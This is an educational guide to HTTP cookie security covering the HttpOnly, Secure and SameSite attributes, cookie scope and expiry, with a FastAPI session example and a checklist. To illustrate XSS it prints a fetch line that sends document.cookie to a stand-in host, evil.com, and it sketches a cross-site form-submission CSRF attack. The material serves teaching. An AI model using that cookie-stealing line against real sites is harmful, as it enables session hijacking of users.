## 1. What Are Cookies?

Cookies are small pieces of data the server asks the browser to store and automatically send back on subsequent requests. They are the original mechanism for maintaining state in stateless HTTP.

Without cookies, every request to a website would be anonymous. Cookies let the server say "remember this about the client" — a session ID, a preference, an auth token.

**Where cookies live:** In the browser. The server sets them with `Set-Cookie` response headers. The browser stores them and sends them back with every matching request via the `Cookie` request header.

---

## 2. Cookie Structure

```
Set-Cookie: session_id=abc123xyz; Domain=.example.com; Path=/;
            Expires=Wed, 15 Jun 2025 14:30:00 GMT; HttpOnly; Secure;
            SameSite=Strict

Name=Value        → The data (required)
Domain            → Which domains receive this cookie
Path              → Which URL paths trigger sending this cookie
Expires / Max-Age → When the cookie expires
HttpOnly          → JavaScript cannot read this cookie
Secure            → Only sent over HTTPS
SameSite          → Cross-site send rules (Strict/Lax/None)
```

---

## 3. The Security Attributes (Critical)

These three attributes determine how secure your cookies are:

### HttpOnly

```
Set-Cookie: session_id=abc123; HttpOnly

WITH HttpOnly:
  JavaScript: document.cookie  → session_id is NOT visible
  HTTP requests: Cookie: session_id=abc123  → sent automatically ✓

WITHOUT HttpOnly:
  JavaScript: document.cookie  → "session_id=abc123; other=value"
  An XSS vulnerability can steal the session token via:
  fetch("https://evil.com/steal?token=" + document.cookie)
```

**Rule: Always set HttpOnly on session tokens and auth cookies.** There is no reason for JavaScript to read a session ID. If your JavaScript needs auth information, use a separate non-sensitive cookie or an in-memory token.

### Secure

```
Set-Cookie: session_id=abc123; Secure

WITHOUT Secure:
  Browser sends cookie over HTTP and HTTPS.
  On HTTP: cookie visible to network observers (Wi-Fi, ISP, proxies).
  Session hijacking trivially possible on unencrypted networks.

WITH Secure:
  Browser only sends cookie over HTTPS.
  Cookie never appears in plaintext traffic.
```

**Rule: Always set Secure for any sensitive cookie.** If you're running HTTPS (you should be), this has zero downside.

### SameSite

The most important and most misunderstood cookie attribute. Controls whether the browser sends the cookie on cross-site requests.

```
SameSite=Strict:
  Cookie sent ONLY when the request origin = the cookie's domain.
  User clicks a link from google.com to yourbank.com → cookie NOT sent.
  User navigates directly or submits form on yourbank.com → cookie sent.
  Use for: highest security, admin panels, banking
  Downside: breaks OAuth flows where you redirect from third-party back to your site

SameSite=Lax (default in modern browsers):
  Cookie sent on top-level navigation (GET only) + same-site requests.
  User clicks a link to yourbank.com → cookie sent (it's a GET navigation)
  Embedded image/iframe from yourbank.com on evil.com → cookie NOT sent
  form POST from evil.com to yourbank.com → cookie NOT sent (CSRF protection!)
  Use for: most applications. Balance of security and usability.

SameSite=None:
  Cookie sent on ALL requests, including cross-origin.
  REQUIRES Secure attribute (browser enforces this).
  Use for: legitimate cross-site contexts (OAuth, embedded widgets, payments)
```

**The CSRF protection story:**

```
WITHOUT SameSite (old default):
  User logged into bank.com (session cookie in browser).
  User visits evil.com.
  evil.com's page has: <form action="https://bank.com/transfer" method="POST">
  Form submits automatically. Browser sends bank.com's session cookie.
  Bank processes the transfer. User's money stolen. Classic CSRF.

WITH SameSite=Lax or Strict:
  evil.com submits POST to bank.com.
  Browser: "This is a cross-site POST. SameSite=Lax blocks cross-site POST."
  Cookie not sent. Bank sees unauthenticated request. CSRF prevented.
```

## 4. Domain and Path Scope

```
Domain=.example.com   → cookie sent to example.com AND all subdomains
                         (api.example.com, auth.example.com, etc.)
Domain=api.example.com → cookie sent ONLY to api.example.com

Path=/api             → cookie sent only to requests matching /api*
Path=/                → cookie sent to all paths (default)

Cookie NOT set with Domain = only sent to the exact domain that set it
```

**The leading dot is significant:** `Domain=example.com` means only `example.com`. `Domain=.example.com` includes all subdomains. Most browsers now treat them the same (no leading dot), but specify explicitly.

## 5. Session vs. Persistent Cookies

```
SESSION COOKIE (no Expires or Max-Age):
  Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
  → Deleted when browser closes.
  → Good for: auth sessions you want to expire on browser close.

PERSISTENT COOKIE (with Expires or Max-Age):
  Set-Cookie: remember_me=token123; Max-Age=2592000; HttpOnly; Secure; SameSite=Lax
  Max-Age=2592000  → 30 days (in seconds)
  Expires=...      → absolute date (avoid — depends on client clock)
  → Survives browser restart.
  → Good for: "remember me" functionality, preferences.

DELETING A COOKIE:
  Set-Cookie: session=; Max-Age=0; Path=/; Domain=.example.com
  Or:
  Set-Cookie: session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT
  Setting Max-Age=0 or past Expires tells browser to delete immediately.
```

---

## 6. Cookie Size Limits

Cookies are limited: ~4KB per cookie, ~50 cookies per domain (browser-dependent). For anything larger (user preferences, state), use:
- Server-side sessions (store data in Redis/DB, cookie = session ID only)
- localStorage / sessionStorage (client-side, not sent with requests)
- JWTs (for stateless auth — but see topic 8.4 for trade-offs)

## 7. Code Examples

### Setting cookies correctly in FastAPI

```python
from fastapi import FastAPI, Response, Cookie, HTTPException
from typing import Optional
import secrets
import redis

app = FastAPI()
cache = redis.Redis()

@app.post("/login")
async def login(credentials: LoginRequest, response: Response):
    user = await authenticate(credentials.email, credentials.password)
    if not user:
        raise HTTPException(status_code=401, detail="Invalid credentials")

    # Generate an opaque session ID (never put sensitive data in the cookie itself)
    session_id = secrets.token_urlsafe(32)

    # Store session data server-side
    cache.setex(
        f"session:{session_id}",
        86400,  # 24 hours
        json.dumps({"user_id": user.id, "email": user.email})
    )

    # Set cookie with all security attributes
    response.set_cookie(
        key="session_id",
        value=session_id,
        max_age=86400,          # 24 hours
        httponly=True,          # no JS access
        secure=True,            # HTTPS only
        samesite="lax",         # CSRF protection
        domain=".example.com",  # share across subdomains
        path="/",
    )
    return {"message": "Logged in successfully"}

@app.post("/logout")
async def logout(
    response: Response,
    session_id: Optional[str] = Cookie(default=None)
):
    if session_id:
        cache.delete(f"session:{session_id}")

    # Delete the cookie
    response.delete_cookie(
        key="session_id",
        path="/",
        domain=".example.com",
        secure=True,
        httponly=True,
        samesite="lax",
    )
    return {"message": "Logged out"}

# Dependency to get current session
async def get_current_user(
    session_id: Optional[str] = Cookie(default=None)
) -> dict:
    if not session_id:
        raise HTTPException(status_code=401, detail="Not authenticated")

    data = cache.get(f"session:{session_id}")
    if not data:
        raise HTTPException(status_code=401, detail="Session expired")

    return json.loads(data)
```

## 8. The Cookie Security Checklist

```
For every cookie you set, confirm:

□ Contains NO sensitive data (only opaque session IDs or non-sensitive preferences)
□ HttpOnly=true if JavaScript doesn't need to read it (session tokens ALWAYS)
□ Secure=true (HTTPS only) — no exceptions in production
□ SameSite=Lax minimum (Strict for high-security, None only for cross-site use cases)
□ Expiry is reasonable (not 10 years for a session token)
□ Domain scope is as narrow as needed
□ Deleted server-side (not just cookie-side) on logout
```

## 9. Senior Engineer Perspective

**What a junior gets wrong:**

Storing sensitive data inside the cookie value. A cookie with `user_id=123&is_admin=true` is trivially forged by the user. Always store an opaque random session ID in the cookie and look up the actual session data server-side.

The second mistake: not deleting the server-side session on logout. Deleting the cookie from the browser doesn't invalidate the session — someone who captured the cookie value before logout can still use it. The session must be invalidated server-side.

**What a senior always does:**

Uses `secrets.token_urlsafe(32)` (or equivalent) for session IDs. 32 bytes = 256 bits of entropy = cryptographically unguessable. Never uses sequential IDs or timestamps as session tokens.

Sets `SameSite=Lax` as the default and explicitly justifies any cookie that needs `SameSite=None`.
